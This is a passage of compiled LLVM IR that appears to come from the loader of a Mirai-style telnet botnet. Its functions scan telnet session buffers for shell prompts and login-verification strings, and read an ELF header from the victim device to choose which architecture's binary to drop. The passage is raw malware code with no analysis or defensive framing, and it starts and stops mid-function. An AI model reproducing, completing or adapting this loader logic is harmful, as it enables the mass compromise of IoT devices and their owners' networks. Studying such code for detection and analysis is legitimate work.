  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

33:                                               ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 18
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

42:                                               ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 18
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

51:                                               ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 18
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

60:                                               ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %66

62:                                               ; preds = %51
  br label %63

63:                                               ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = add nsw i32 %64, -1
  store i32 %65, i32* %5, align 4
  br label %12, !llvm.loop !10

66:                                               ; preds = %60, %12
  %67 = load i32, i32* %6, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %82

69:                                               ; preds = %66
  store i32 0, i32* %7, align 4
  %70 = load %struct.connection*, %struct.connection** %3, align 8
  %71 = getelementptr inbounds %struct.connection, %struct.connection* %70, i32 0, i32 18
  %72 = getelementptr inbounds [8192 x i8], [8192 x i8]* %71, i64 0, i64 0
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 12
  %75 = load i16, i16* %74, align 8
  %76 = zext i16 %75 to i32
  %77 = call i32 @util_memsearch(i8* %72, i32 %76, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i32 7)
  store i32 %77, i32* %7, align 4
  %78 = icmp ne i32 %77, -1
  br i1 %78, label %79, label %81

79:                                               ; preds = %69
  %80 = load i32, i32* %7, align 4
  store i32 %80, i32* %6, align 4
  br label %81

81:                                               ; preds = %79, %69
  br label %82

82:                                               ; preds = %81, %66
  %83 = load i32, i32* %6, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %86

85:                                               ; preds = %82
  store i32 0, i32* %2, align 4
  br label %88

86:                                               ; preds = %82
  %87 = load i32, i32* %6, align 4
  store i32 %87, i32* %2, align 4
  br label %88

88:                                               ; preds = %86, %85
  %89 = load i32, i32* %2, align 4
  ret i32 %89
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_prompt(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 -1, i32* %6, align 4
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 12
  %9 = load i16, i16* %8, align 8
  %10 = zext i16 %9 to i32
  store i32 %10, i32* %5, align 4
  br label %11

11:                                               ; preds = %62, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sge i32 %12, 0
  br i1 %13, label %14, label %65

14:                                               ; preds = %11
  %15 = load %struct.connection*, %struct.connection** %3, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 18
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %16, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 58
  br i1 %22, label %59, label %23

23:                                               ; preds = %14
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 18
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 62
  br i1 %31, label %59, label %32

32:                                               ; preds = %23
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 18
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 36
  br i1 %40, label %59, label %41

41:                                               ; preds = %32
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 18
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 35
  br i1 %49, label %59, label %50

50:                                               ; preds = %41
  %51 = load %struct.connection*, %struct.connection** %3, align 8
  %52 = getelementptr inbounds %struct.connection, %struct.connection* %51, i32 0, i32 18
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  br i1 %58, label %59, label %61

59:                                               ; preds = %50, %41, %32, %23, %14
  %60 = load i32, i32* %5, align 4
  store i32 %60, i32* %6, align 4
  br label %65

61:                                               ; preds = %50
  br label %62

62:                                               ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = add nsw i32 %63, -1
  store i32 %64, i32* %5, align 4
  br label %11, !llvm.loop !11

65:                                               ; preds = %59, %11
  %66 = load i32, i32* %6, align 4
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %68, label %69

68:                                               ; preds = %65
  store i32 0, i32* %2, align 4
  br label %71

69:                                               ; preds = %65
  %70 = load i32, i32* %6, align 4
  store i32 %70, i32* %2, align 4
  br label %71

71:                                               ; preds = %69, %68
  %72 = load i32, i32* %2, align 4
  ret i32 %72
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_verify_login(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

16:                                               ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

18:                                               ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_copy_op(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

16:                                               ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

18:                                               ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_arch(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca %struct.elf_hdr*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 3
  %10 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %9, i32 0, i32 8
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %254, label %13

13:                                               ; preds = %1
  store i32 0, i32* %5, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i8** %6, align 8
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 18
  %16 = getelementptr inbounds [8192 x i8], [8192 x i8]* %15, i64 0, i64 0
  %17 = load %struct.connection*, %struct.connection** %3, align 8
  %18 = getelementptr inbounds %struct.connection, %struct.connection* %17, i32 0, i32 12
  %19 = load i16, i16* %18, align 8
  %20 = zext i16 %19 to i32
  %21 = load i8*, i8** %6, align 8
  %22 = call i32 @util_memsearch(i8* %16, i32 %20, i8* %21, i32 4)
  store i32 %22, i32* %5, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  store i32 0, i32* %2, align 4
  br label %294

25:                                               ; preds = %13
  %26 = load i32, i32* %5, align 4
  %27 = sub nsw i32 %26, 4
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = icmp sgt i32 %28, 0
  br i1 %29, label %30, label %253

30:                                               ; preds = %25
  %31 = load %struct.connection*, %struct.connection** %3, align 8
  %32 = getelementptr inbounds %struct.connection, %struct.connection* %31, i32 0, i32 18
  %33 = getelementptr inbounds [8192 x i8], [8192 x i8]* %32, i64 0, i64 0
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = bitcast i8* %36 to %struct.elf_hdr*
  store %struct.elf_hdr* %37, %struct.elf_hdr** %4, align 8
  %38 = load %struct.connection*, %struct.connection** %3, align 8
  %39 = getelementptr inbounds %struct.connection, %struct.connection* %38, i32 0, i32 3
  %40 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %39, i32 0, i32 8
  store i8 1, i8* %40, align 1
  %41 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %42 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %41, i32 0, i32 0
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %42, i64 0, i64 5
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 1
  br i1 %46, label %47, label %53

47:                                               ; preds = %30
  %48 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %49 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %48, i32 0, i32 2
  %50 = load i16, i16* %49, align 2
  %51 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %52 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %51, i32 0, i32 2
  store i16 %50, i16* %52, align 2
  br label %62

53:                                               ; preds = %30
  %54 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %55 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %54, i32 0, i32 2
  %56 = load i16, i16* %55, align 2
  %57 = zext i16 %56 to i32
  %58 = call i32 (i32, ...) bitcast (i32 (...)* @htons to i32 (i32, ...)*)(i32 %57)
  %59 = trunc i32 %58 to i16
  %60 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %61 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %60, i32 0, i32 2
  store i16 %59, i16* %61, align 2
  br label %62

62:                                               ; preds = %53, %47
  %63 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %64 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %63, i32 0, i32 2
  %65 = load i16, i16* %64, align 2
  %66 = zext i16 %65 to i32
  %67 = icmp eq i32 %66, 40
  br i1 %67, label %74, label %68

68:                                               ; preds = %62
  %69 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %70 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %69, i32 0, i32 2
  %71 = load i16, i16* %70, align 2
  %72 = zext i16 %71 to i32
  %73 = icmp eq i32 %72, 183
  br i1 %73, label %74, label %80

74:                                               ; preds = %68, %62
  %75 = load %struct.connection*, %struct.connection** %3, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 3
  %77 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %76, i32 0, i32 2
  %78 = getelementptr inbounds [6 x i8], [6 x i8]* %77, i64 0, i64 0
  %79 = call i8* @strcpy(i8* %78, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0)) #5
  br label %252

80:                                               ; preds = %68
  %81 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %82 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %81, i32 0, i32 2
  %83 = load i16, i16* %82, align 2
  %84 = zext i16 %83 to i32
  %85 = icmp eq i32 %84, 8
  br i1 %85, label %92, label %86

86:                                               ; preds = %80
  %87 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %88 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %87, i32 0, i32 2
  %89 = load i16, i16* %88, align 2
  %90 = zext i16 %89 to i32
  %91 = icmp eq i32 %90, 10
  br i1 %91, label %92, label %112

92:                                               ; preds = %86, %80
  %93 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %94 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %93, i32 0, i32 0
  %95 = getelementptr inbounds [16 x i8], [16 x i8]* %94, i64 0, i64 5
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 1
  br i1 %98, label %99, label %105

99:                                               ; preds = %92
  %100 = load %struct.connection*, %struct.connection** %3, align 8
  %101 = getelementptr inbounds %struct.connection, %struct.connection* %100, i32 0, i32 3
  %102 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %101, i32 0, i32 2
  %103 = getelementptr inbounds [6 x i8], [6 x i8]* %102, i64 0, i64 0
  %104 = call i8* @strcpy(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0)) #5
  br label %111

105:                                              ; preds = %92
  %106 = load %struct.connection*, %struct.connection** %3, align 8
  %107 = getelementptr inbounds %struct.connection, %struct.connection* %106, i32 0, i32 3
  %108 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %107, i32 0, i32 2
  %109 = getelementptr inbounds [6 x i8], [6 x i8]* %108, i64 0, i64 0
  %110 = call i8* @strcpy(i8* %109, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0)) #5
  br label %111

111:                                              ; preds = %105, %99
  br label %251

112:                                              ; preds = %86
  %113 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %114 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %113, i32 0, i32 2
  %115 = load i16, i16* %114, align 2
  %116 = zext i16 %115 to i32
  %117 = icmp eq i32 %116, 3
  br i1 %117, label %136, label %118

118:                                              ; preds = %112
  %119 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %120 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %119, i32 0, i32 2
  %121 = load i16, i16* %120, align 2
  %122 = zext i16 %121 to i32
  %123 = icmp eq i32 %122, 6
  br i1 %123, label %136, label %124

124:                                              ; preds = %118
  %125 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %126 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %125, i32 0, i32 2
  %127 = load i16, i16* %126, align 2
  %128 = zext i16 %127 to i32
  %129 = icmp eq i32 %128, 7
  br i1 %129, label %136, label %130

130:                                              ; preds = %124
  %131 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %132 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %131, i32 0, i32 2
  %133 = load i16, i16* %132, align 2
  %134 = zext i16 %133 to i32
  %135 = icmp eq i32 %134, 62
  br i1 %135, label %136, label %142

136:                                              ; preds = %130, %124, %118, %112
  %137 = load %struct.connection*, %struct.connection** %3, align 8
  %138 = getelementptr inbounds %struct.connection, %struct.connection* %137, i32 0, i32 3
  %139 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %138, i32 0, i32 2
  %140 = getelementptr inbounds [6 x i8], [6 x i8]* %139, i64 0, i64 0
  %141 = call i8* @strcpy(i8* %140, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0)) #5
  br label %250

142:                                              ; preds = %130
  %143 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %144 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %143, i32 0, i32 2
  %145 = load i16, i16* %144, align 2
  %146 = zext i16 %145 to i32
  %147 = icmp eq i32 %146, 2
  br i1 %147, label %160, label %148

148:                                              ; preds = %142
  %149 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %150 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %149, i32 0, i32 2
  %151 = load i16, i16* %150, align 2
  %152 = zext i16 %151 to i32
  %153 = icmp eq i32 %152, 18
  br i1 %153, label %160, label %154

154:                                              ; preds = %148
  %155 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %156 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %155, i32 0, i32 2
  %157 = load i16, i16* %156, align 2
  %158 = zext i16 %157 to i32
  %159 = icmp eq i32 %158, 43
  br i1 %159, label %160, label %166

160:                                              ; preds = %154, %148, %142
  %161 = load %struct.connection*, %struct.connection** %3, align 8
  %162 = getelementptr inbounds %struct.connection, %struct.connection* %161, i32 0, i32 3
  %163 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %162, i32 0, i32 2
  %164 = getelementptr inbounds [6 x i8], [6 x i8]* %163, i64 0, i64 0
  %165 = call i8* @strcpy(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0)) #5
  br label %249

166:                                              ; preds = %154
  %167 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %168 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %167, i32 0, i32 2
  %169 = load i16, i16* %168, align 2
  %170 = zext i16 %169 to i32
  %171 = icmp eq i32 %170, 4
  br i1 %171, label %178, label %172

172:                                              ; preds = %166
  %173 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %174 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %173, i32 0, i32 2
  %175 = load i16, i16* %174, align 2
  %176 = zext i16 %175 to i32
  %177 = icmp eq i32 %176, 5
  br i1 %177, label %178, label %184

178:                                              ; preds = %172, %166
  %179 = load %struct.connection*, %struct.connection** %3, align 8
  %180 = getelementptr inbounds %struct.connection, %struct.connection* %179, i32 0, i32 3
  %181 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %180, i32 0, i32 2
  %182 = getelementptr inbounds [6 x i8], [6 x i8]* %181, i64 0, i64 0
  %183 = call i8* @strcpy(i8* %182, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #5
  br label %248

184:                                              ; preds = %172
  %185 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %186 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %185, i32 0, i32 2
  %187 = load i16, i16* %186, align 2
  %188 = zext i16 %187 to i32
  %189 = icmp eq i32 %188, 20
  br i1 %189, label %196, label %190

190:                                              ; preds = %184
  %191 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %192 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %191, i32 0, i32 2
  %193 = load i16, i16* %192, align 2
  %194 = zext i16 %193 to i32
  %195 = icmp eq i32 %194, 21
  br i1 %195, label %196, label %202

196:                                              ; preds = %190, %184
  %197 = load %struct.connection*, %struct.connection** %3, align 8
  %198 = getelementptr inbounds %struct.connection, %struct.connection* %197, i32 0, i32 3
  %199 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %198, i32 0, i32 2
  %200 = getelementptr inbounds [6 x i8], [6 x i8]* %199, i64 0, i64 0
  %201 = call i8* @strcpy(i8* %200, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0)) #5
  br label %247

202:                                              ; preds = %190
  %203 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %204 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %203, i32 0, i32 2
  %205 = load i16, i16* %204, align 2
  %206 = zext i16 %205 to i32
  %207 = icmp eq i32 %206, 42
  br i1 %207, label %208, label %214

208:                                              ; preds = %202
  %209 = load %struct.connection*, %struct.connection** %3, align 8
  %210 = getelementptr inbounds %struct.connection, %struct.connection* %209, i32 0, i32 3
  %211 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %210, i32 0, i32 2
  %212 = getelementptr inbounds [6 x i8], [6 x i8]* %211, i64 0, i64 0
  %213 = call i8* @strcpy(i8* %212, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0)) #5
  br label %246

214:                                              ; preds = %202
  %215 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %216 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %215, i32 0, i32 2
  %217 = load i16, i16* %216, align 2
  %218 = zext i16 %217 to i32
  %219 = icmp eq i32 %218, 39
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = load %struct.connection*, %struct.connection** %3, align 8
  %222 = getelementptr inbounds %struct.connection, %struct.connection* %221, i32 0, i32 3
  %223 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %222, i32 0, i32 2
  %224 = getelementptr inbounds [6 x i8], [6 x i8]* %223, i64 0, i64 0
  %225 = call i8* @strcpy(i8* %224, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.13, i64 0, i64 0)) #5
  br label %245

226:                                              ; preds = %214
  %227 = load %struct.elf_hdr*, %struct.elf_hdr** %4, align 8
  %228 = getelementptr inbounds %struct.elf_hdr, %struct.elf_hdr* %227, i32 0, i32 2
  %229 = load i16, i16* %228, align 2
  %230 = zext i16 %229 to i32
  %231 = icmp eq i32 %230, 93
  br i1 %231, label %232, label %238

232:                                              ; preds = %226
  %233 = load %struct.connection*, %struct.connection** %3, align 8
  %234 = getelementptr inbounds %struct.connection, %struct.connection* %233, i32 0, i32 3
  %235 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %234, i32 0, i32 2
  %236 = getelementptr inbounds [6 x i8], [6 x i8]* %235, i64 0, i64 0
  %237 = call i8* @strcpy(i8* %236, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0)) #5
  br label %244

238:                                              ; preds = %226
  %239 = load %struct.connection*, %struct.connection** %3, align 8
  %240 = getelementptr inbounds %struct.connection, %struct.connection* %239, i32 0, i32 3
  %241 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %240, i32 0, i32 2
  %242 = getelementptr inbounds [6 x i8], [6 x i8]* %241, i64 0, i64 0
  store i8 0, i8* %242, align 8
  %243 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %243)
  br label %244

244:                                              ; preds = %238, %232
  br label %245

245:                                              ; preds = %244, %220
  br label %246

246:                                              ; preds = %245, %208
  br label %247

247:                                              ; preds = %246, %196
  br label %248

248:                                              ; preds = %247, %178
  br label %249

249:                                              ; preds = %248, %160
  br label %250

250:                                              ; preds = %249, %136
  br label %251

251:                                              ; preds = %250, %111
  br label %252

252:                                              ; preds = %251, %74
  br label %253

253:                                              ; preds = %252, %25
  br label %293

254:                                              ; preds = %1
  store i32 0, i32* %7, align 4
  %255 = load %struct.connection*, %struct.connection** %3, align 8
  %256 = getelementptr inbounds %struct.connection, %struct.connection* %255, i32 0, i32 18
  %257 = getelementptr inbounds [8192 x i8], [8192 x i8]* %256, i64 0, i64 0
  %258 = load %struct.connection*, %struct.connection** %3, align 8
  %259 = getelementptr inbounds %struct.connection, %struct.connection* %258, i32 0, i32 12
  %260 = load i16, i16* %259, align 8
  %261 = zext i16 %260 to i32
  %262 = call i32 @util_memsearch(i8* %257, i32 %261, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i32 23)
  store i32 %262, i32* %7, align 4
  %263 = icmp ne i32 %262, -1
  br i1 %263, label %264, label %266

264:                                              ; preds = %254
  %265 = load i32, i32* %7, align 4
  store i32 %265, i32* %2, align 4
  br label %294

266:                                              ; preds = %254
  %267 = load %struct.connection*, %struct.connection** %3, align 8
  %268 = getelementptr inbounds %struct.connection, %struct.connection* %267, i32 0, i32 12
  %269 = load i16, i16* %268, align 8
  %270 = zext i16 %269 to i32
  %271 = icmp sgt i32 %270, 7168
  br i1 %271, label %272, label %292

272:                                              ; preds = %266
  %273 = load %struct.connection*, %struct.connection** %3, align 8
  %274 = getelementptr inbounds %struct.connection, %struct.connection* %273, i32 0, i32 18
  %275 = getelementptr inbounds [8192 x i8], [8192 x i8]* %274, i64 0, i64 0
  %276 = load %struct.connection*, %struct.connection** %3, align 8
  %277 = getelementptr inbounds %struct.connection, %struct.connection* %276, i32 0, i32 18
  %278 = getelementptr inbounds [8192 x i8], [8192 x i8]* %277, i64 0, i64 0
  %279 = getelementptr inbounds i8, i8* %278, i64 6144
  %280 = load %struct.connection*, %struct.connection** %3, align 8
  %281 = getelementptr inbounds %struct.connection, %struct.connection* %280, i32 0, i32 12
  %282 = load i16, i16* %281, align 8
  %283 = zext i16 %282 to i32
  %284 = sub nsw i32 %283, 6144
  %285 = sext i32 %284 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %275, i8* align 1 %279, i64 %285, i1 false)
  %286 = load %struct.connection*, %struct.connection** %3, align 8
  %287 = getelementptr inbounds %struct.connection, %struct.connection* %286, i32 0, i32 12
  %288 = load i16, i16* %287, align 8
  %289 = zext i16 %288 to i32
  %290 = sub nsw i32 %289, 6144
  %291 = trunc i32 %290 to i16
  store i16 %291, i16* %287, align 8
  br label %292

292:                                              ; preds = %272, %266
  br label %293

293:                                              ; preds = %292, %253
  store i32 0, i32* %2, align 4
  br label %294

294:                                              ; preds = %293, %264, %24
  %295 = load i32, i32* %2, align 4
  ret i32 %295
}

declare i32 @htons(...) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1 immarg) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @connection_consume_arm_subtype(%struct.connection* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 18
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 12
